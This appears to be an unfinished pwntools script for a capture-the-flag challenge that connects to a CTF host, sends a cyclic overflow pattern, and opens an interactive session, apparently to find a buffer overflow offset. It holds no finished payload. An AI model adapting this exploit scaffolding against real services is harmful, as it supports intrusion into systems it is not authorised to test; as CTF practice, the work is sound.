from pwn import *
import struct

# print(cyclic(1000))

ip = 'ctf.adl.tw'
port = 11004

r = remote(ip, port)
payload = "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaab"
payload += ""
r.sendline(payload)
r.interactive()